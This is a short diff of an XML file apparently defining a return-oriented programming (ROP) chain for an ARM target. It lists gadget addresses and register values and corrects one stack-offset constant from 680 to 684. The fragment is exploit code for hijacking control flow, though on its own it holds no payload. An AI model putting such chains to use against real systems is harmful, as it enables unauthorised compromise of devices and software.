@@ -188,7 +188,7 @@ arguments:
 		<!-- set R0 = sp offset if continue to loop, 0 if exiting rop chain -->
 
 		<data>GADGET_ADDRESS(pop_r1_pc)</data>              <!-- PC -->
-		<data>680</data>                                    <!-- R1 --> <!-- = +(number of |data| before RETURN) * 4 -->
+		<data>684</data>                                    <!-- R1 --> <!-- = +(number of |data| before RETURN) * 4 -->
 		<data>GADGET_ADDRESS(pop_r4_pc)</data>              <!-- PC -->
 		<data>GADGET_ADDRESS(mul_r0_r1-bx_lr)</data>        <!-- R4 -->
 		<data>GADGET_ADDRESS(blx_r4-pop_r4_pc)</data>       <!-- PC -->
